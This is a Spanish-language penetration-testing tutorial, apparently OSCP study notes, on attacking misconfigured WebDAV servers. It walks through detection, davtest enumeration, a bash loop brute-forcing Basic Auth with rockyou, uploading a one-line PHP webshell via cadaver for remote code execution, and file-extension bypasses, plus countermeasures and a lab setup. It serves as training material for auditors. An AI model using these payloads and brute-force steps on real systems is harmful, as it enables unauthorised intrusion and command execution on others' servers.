## 📚 **Índice 

- [[#📌 **¿Qué es WebDAV?**]]
- [[#🎯 **Objetivo del atacante**]]
- [[#🧭 **Fase 1 — Detección de WebDAV**]]
    - [[#🔍 Métodos HTTP característicos]]
    - [[#🔎 Comprobación rápida]]
- [[#🧭 **Fase 2 — Enumeración de recursos**]]
    - [[#🧪 PROPFIND manual]]
- [[#🧪 **Davtest — Enumeración automática**]]
    - [[#📌 ¿Qué hace Davtest?]]
    - [[#▶️ Uso básico]]
    - [[#🧠 Resultado típico]]
- [[#🔐 **Davtest con autenticación**]]
- [[#🔓 **Ataque de fuerza bruta WebDAV (credenciales)**]]
    - [[#🧠 Ataque manual con `rockyou`]]
- [[#🧭 **Fase 3 — Interacción activa con Cadaver**]]
    - [[#🧰 ¿Qué es Cadaver?]]
    - [[#▶️ Conexión básica]]
    - [[#📂 Comandos esenciales en Cadaver]]
- [[#💥 **Fase 4 — RCE vía WebDAV**]]
    - [[#🎯 Escenario ideal]]
    - [[#🐚 Webshell básica]]
- [[#🧨 **Bypass de restricciones de extensiones**]]
    - [[#🔁 Técnicas comunes]]
- [[#🛡️ **Contramedidas (lado defensivo)**]]
- [[#🧪 **Laboratorio recomendado**]]
    - [[#🐳 WebDAV vulnerable en Docker]]
- [[#🧠 **Resumen mental (OSCP-ready)**]]

## 📌 **¿Qué es WebDAV?**

**WebDAV (Web Distributed Authoring and Versioning)** es una extensión del protocolo **HTTP** que permite a los clientes **crear, modificar, mover y eliminar archivos** directamente en un servidor web.

👉 En esencia:

- HTTP tradicional → **solo lectura**
    
- HTTP + WebDAV → **lectura + escritura + gestión remota de archivos**
    

WebDAV se utiliza comúnmente para:

- Compartición de archivos
    
- Sincronización
    
- Gestión remota de contenidos web
    

⚠️ **Mal configurado = puerta directa a RCE**

---

## 🎯 **Objetivo del atacante**

Durante una auditoría o laboratorio, el atacante busca:

1. Confirmar si **WebDAV está habilitado**
    
2. Enumerar **recursos accesibles**
    
3. Identificar **extensiones de archivo permitidas**
    
4. Determinar si puede **subir archivos**
    
5. Conseguir **ejecución remota de código (RCE)**
    

---

## 🧭 **Fase 1 — Detección de WebDAV**

### 🔍 Métodos HTTP característicos

WebDAV expone métodos adicionales:

```http
OPTIONS
PROPFIND
PUT
DELETE
MOVE
COPY
```

### 🔎 Comprobación rápida

```bash
curl -X OPTIONS http://target/
```

Si ves algo como:

```
Allow: GET, POST, PUT, DELETE, PROPFIND, OPTIONS
```

👉 **WebDAV está activo**

---

## 🧭 **Fase 2 — Enumeración de recursos**

Aquí buscamos:

- Directorios accesibles
    
- Archivos sensibles
    
- Permisos de escritura
    

### 🧪 PROPFIND manual

```bash
curl -X PROPFIND http://target/webdav/
```

---

## 🧪 **Davtest — Enumeración automática**

### 📌 ¿Qué hace Davtest?

- Detecta **extensiones permitidas**
    
- Prueba **subida de archivos**
    
- Verifica si los archivos **se ejecutan**
    
- Intenta identificar **RCE directo**
    

### ▶️ Uso básico

```bash
davtest -url http://target/webdav/
```

### 🧠 Resultado típico

```text
[*] Testing for allowed extensions
[+] .txt     SUCCESS
[+] .html    SUCCESS
[+] .php     SUCCESS
```

💥 **Si `.php` funciona → RCE potencial**

---

## 🔐 **Davtest con autenticación**

Si WebDAV está protegido por **Basic Auth**:

```bash
davtest -url http://target/webdav/ -auth user:password
```

---

## 🔓 **Ataque de fuerza bruta WebDAV (credenciales)**

Cuando:

- Sabes que existe WebDAV
    
- No tienes credenciales
    
- El servidor usa **Basic Auth**
    

### 🧠 Ataque manual con `rockyou`

```bash
cat rockyou.txt | while read password; do
  response=$(davtest -url http://target/webdav/ -auth admin:$password 2>/dev/null | grep -i success)
  if [ "$response" ]; then
    echo "[+] Password found: $password"
    break
  fi
done
```

📌 **Nota**:

- No es rápido
    
- No es stealth
    
- Pero **funciona en labs**
    

---

## 🧭 **Fase 3 — Interacción activa con Cadaver**

### 🧰 ¿Qué es Cadaver?

**Cadaver** es un **cliente WebDAV interactivo**, similar a un FTP client.

Permite:

- Navegar directorios
    
- Subir archivos
    
- Descargar archivos
    
- Borrar recursos
    

---

### ▶️ Conexión básica

```bash
cadaver http://target/webdav/
```

Con autenticación:

```bash
cadaver http://target/webdav/
Username: admin
Password: ****
```

---

### 📂 Comandos esenciales en Cadaver

```bash
ls              # Listar archivos
cd              # Cambiar directorio
put shell.php   # Subir archivo
get file.txt    # Descargar archivo
delete file     # Eliminar archivo
```

---

## 💥 **Fase 4 — RCE vía WebDAV**

### 🎯 Escenario ideal

- WebDAV permite **PUT**
    
- Permite subir **.php**
    
- El directorio es accesible desde navegador
    

### 🐚 Webshell básica

```php
<?php system($_GET['cmd']); ?>
```

Subida:

```bash
put shell.php
```

Ejecución:

```
http://target/webdav/shell.php?cmd=id
```

💣 **RCE conseguido**

---

## 🧨 **Bypass de restricciones de extensiones**

Si `.php` está bloqueado:

### 🔁 Técnicas comunes

- `.php.txt`
    
- `.phtml`
    
- `.php;.txt`
    
- `.php%00.txt`
    
- Doble extensión
    

Ejemplo:

```bash
put shell.php.txt
```

Luego probar si el servidor **interpreta PHP igual**.

---

## 🛡️ **Contramedidas (lado defensivo)**

Para mitigar ataques WebDAV:

- ❌ Deshabilitar WebDAV si no es necesario
    
- 🔒 Autenticación fuerte (no Basic Auth)
    
- 🚫 No permitir `PUT` en rutas públicas
    
- 🚫 Bloquear ejecución de scripts (`php`, `asp`)
    
- 📁 Separar **upload dir** de **web root**
    
- 🔍 Monitorizar métodos HTTP inusuales
    

---

## 🧪 **Laboratorio recomendado**

### 🐳 WebDAV vulnerable en Docker

```text
https://hub.docker.com/r/bytemark/webdav
```

Ideal para practicar:

- Enumeración
    
- Davtest
    
- Cadaver
    
- Subida de webshell
    
- RCE
    

---

## 🧠 **Resumen mental (OSCP-ready)**

|Fase|Objetivo|
|---|---|
|Detección|¿Existe WebDAV?|
|Enumeración|¿Qué puedo ver?|
|Extensiones|¿Qué puedo subir?|
|Escritura|¿PUT permitido?|
|Ejecución|¿RCE posible?|

---

